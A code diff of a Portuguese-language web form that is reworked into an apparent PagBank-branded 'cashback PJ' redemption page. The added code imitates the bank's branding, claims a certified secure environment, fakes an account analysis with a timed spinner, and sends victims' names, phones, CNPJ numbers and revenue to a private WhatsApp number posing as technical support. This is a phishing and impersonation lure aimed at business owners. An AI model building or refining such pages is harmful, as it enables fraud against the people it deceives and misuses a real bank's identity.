@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resgate de Cashback - Pessoa Jurídica</title>
+    <title>Resgate de Cashback - PagBank PJ</title>
     <style>
         * {
             box-sizing: border-box;
@@ -12,7 +12,8 @@
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         body {
-            background: radial-gradient(circle at top right, #0f2027, #203a43, #2c5364);
+            /* Cores inspiradas no ecossistema PagBank */
+            background: radial-gradient(circle at top right, #004b23, #007200, #132a13);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,11 +25,24 @@
             background: #ffffff;
             padding: 40px 30px;
             border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             max-width: 480px;
             width: 100%;
             position: relative;
             overflow: hidden;
+        }
+        /* Marca d'água PagBank simulada ao fundo */
+        .container::before {
+            content: "PagBank";
+            position: absolute;
+            bottom: -20px;
+            right: -20px;
+            font-size: 90px;
+            font-weight: 900;
+            color: rgba(0, 114, 0, 0.04);
+            font-style: italic;
+            pointer-events: none;
+            user-select: none;
         }
         .header-accent {
             position: absolute;
@@ -36,17 +50,18 @@
             left: 0;
             width: 100%;
             height: 6px;
-            background: linear-gradient(to right, #11998e, #38ef7d);
+            /* Degradê verde e dourado do PagBank */
+            background: linear-gradient(to right, #9ef01a, #70e000, #ffb703);
         }
         h1 {
-            color: #111;
+            color: #004b23;
             font-size: 24px;
             margin-bottom: 8px;
             text-align: center;
             font-weight: 700;
         }
         p.subtitle {
-            color: #666;
+            color: #555;
             font-size: 14px;
             text-align: center;
             margin-bottom: 25px;
@@ -58,7 +73,7 @@
         label {
             display: block;
             margin-bottom: 6px;
-            color: #444;
+            color: #004b23;
             font-weight: 600;
             font-size: 13px;
             text-transform: uppercase;
@@ -74,15 +89,15 @@
             background-color: #f9f9f9;
         }
         input:focus {
-            border-color: #11998e;
+            border-color: #007200;
             background-color: #fff;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(17, 153, 142, 0.15);
+            box-shadow: 0 0 0 3px rgba(0, 114, 0, 0.15);
         }
-        button {
+        .btn-submit {
             width: 100%;
             padding: 15px;
-            background: linear-gradient(to right, #11998e, #38ef7d);
+            background: linear-gradient(to right, #007200, #38ef7d);
             color: white;
             border: none;
             border-radius: 8px;
@@ -91,18 +106,34 @@
             cursor: pointer;
             transition: transform 0.2s, filter 0.2s;
             margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(56, 239, 125, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 114, 0, 0.2);
         }
-        button:hover {
-            filter: brightness(1.05);
+        .btn-submit:hover {
+            filter: brightness(1.1);
         }
-        button:active {
-            transform: scale(0.98);
+        .btn-whatsapp {
+            display: inline-block;
+            width: 100%;
+            padding: 15px;
+            background-color: #25d366;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none;
+            margin-top: 20px;
+            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
+            transition: transform 0.2s, background-color 0.2s;
+        }
+        .btn-whatsapp:hover {
+            background-color: #20ba5a;
+            transform: scale(1.02);
         }
         .footer-note {
             text-align: center;
             font-size: 11px;
-            color: #999;
+            color: #888;
             margin-top: 20px;
         }
         
@@ -126,15 +157,15 @@
             width: 50px;
             height: 50px;
             border: 5px solid #f3f3f3;
-            border-top: 5px solid #11998e;
+            border-top: 5px solid #007200;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
         }
         .success-icon {
             font-size: 50px;
-            color: #28a745;
-            margin-bottom: 20px;
+            color: #007200;
+            margin-bottom: 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -147,9 +178,10 @@
 <div class="container">
     <div class="header-accent"></div>
     
+    <!-- Formulário Principal -->
     <div id="form-container">
         <h1>Resgate de Cashback PJ</h1>
-        <p class="subtitle">Seja bem-vindo! Informe os dados da sua conta jurídica abaixo para iniciarmos a análise de valores a receber.</p>
+        <p class="subtitle">Verifique se a sua conta jurídica possui valores acumulados para resgate com a segurança PagBank.</p>
         
         <form id="cashback-form" onsubmit="enviarFormulario(event)">
             <div class="form-group">
@@ -172,26 +204,32 @@
                 <input type="text" id="renda" required placeholder="R$ 0,00" oninput="mascaraMoeda(this)">
             </div>
             
-            <button type="submit">Consultar Valores Disponíveis</button>
+            <button type="submit" class="btn-submit">Consultar Valores Disponíveis</button>
         </form>
         
-        <p class="footer-note">🔒 Seus dados corporativos estão protegidos de acordo com as normas da LGPD.</p>
+        <p class="footer-note">🔒 Ambiente seguro homologado de acordo com a LGPD.</p>
     </div>
 
+    <!-- Tela de Carregamento -->
     <div id="loading-overlay" class="overlay">
         <div class="spinner"></div>
-        <h2 style="font-size: 20px; margin-bottom: 10px;">Analisando sua conta...</h2>
-        <p style="color: #666; font-size: 14px;">Aguarde, estamos verificando a existência de cashback disponível junto ao sistema.</p>
+        <h2 style="font-size: 20px; margin-bottom: 10px; color: #004b23;">Analisando conta PagBank...</h2>
+        <p style="color: #666; font-size: 14px;">Aguarde enquanto cruzamos as informações de faturamento e taxas recolhidas.</p>
     </div>
 
+    <!-- Tela de Sucesso com o Botão de Redirecionamento -->
     <div id="success-overlay" class="overlay">
-        <div class="success-icon">✓</div>
-        <h2 style="font-size: 20px; color: #111; margin-bottom: 10px;">Dados Enviados!</h2>
+        <div class="success-icon">💰</div>
+        <h2 style="font-size: 20px; color: #004b23; margin-bottom: 10px;">Análise Concluída!</h2>
         <p style="color: #444; font-size: 14px; line-height: 1.6;">
-            Obrigado, <strong id="user-name"></strong>. Nossa equipe recebeu sua solicitação. <br><br>
-            A análise do CNPJ <span id="user-cnpj" style="font-weight: 600;"></span> está sendo processada. 
-            Em instantes, entraremos em contato via WhatsApp para informar os valores que você tem a receber!
+            Olá <strong id="user-name"></strong>, identificamos uma simulação disponível para o CNPJ <span id="user-cnpj" style="font-weight: 600;"></span>.<br><br>
+            Para liberar o extrato e realizar o resgate do seu cashback, clique no botão abaixo para falar com o nosso suporte técnico.
         </p>
+        
+        <!-- Botão Dinâmico do WhatsApp -->
+        <a id="whatsapp-link" href="#" target="_blank" class="btn-whatsapp">
+            🟢 Resgatar Cashback via WhatsApp
+        </a>
     </div>
 </div>
 
@@ -219,29 +257,33 @@
         input.value = v;
     }
 
-    // Lógica de Envio do Formulário
+    // Lógica de Processamento e Criação do Link do WhatsApp
     function enviarFormulario(event) {
-        event.preventDefault(); // Evita que a página recarregue
+        event.preventDefault(); 
         
-        // Captura os dados digitados
         const nome = document.getElementById('nome').value;
+        const telefone = document.getElementById('telefone').value;
         const cnpj = document.getElementById('cnpj').value;
+        const renda = document.getElementById('renda').value;
         
-        // Passa o nome e o cnpj para a tela final de sucesso
         document.getElementById('user-name').innerText = nome;
         document.getElementById('user-cnpj').innerText = cnpj;
 
-        // Esconde o formulário e mostra o Loading
+        // Criação da mensagem automática personalizada para o seu WhatsApp
+        const numeroWhats = "54999422678";
+        const textoMensagem = `Olá, gostaria de concluir meu resgate de Cashback PagBank PJ.%0A%0A*Dados preenchidos:*%0A👤 *Nome:* ${nome}%0A📱 *Telefone:* ${telefone}%0A💼 *CNPJ:* ${cnpj}%0A📊 *Faturamento:* ${renda}`;
+        
+        // Aplica o link gerado ao botão do WhatsApp
+        document.getElementById('whatsapp-link').href = `https://api.whatsapp.com/send?phone=${numeroWhats}&text=${textoMensagem}`;
+
+        // Transição de telas
         document.getElementById('form-container').style.display = 'none';
         document.getElementById('loading-overlay').style.display = 'flex';
 
-        // Simula uma análise de 3 segundos antes de mostrar o resultado
         setTimeout(() => {
             document.getElementById('loading-overlay').style.display = 'none';
             document.getElementById('success-overlay').style.display = 'flex';
-            
-            // Aqui você pode integrar com seu backend, CRM ou API do WhatsApp para receber os dados
-        }, 3500); 
+        }, 3000); 
     }
 </script>
 
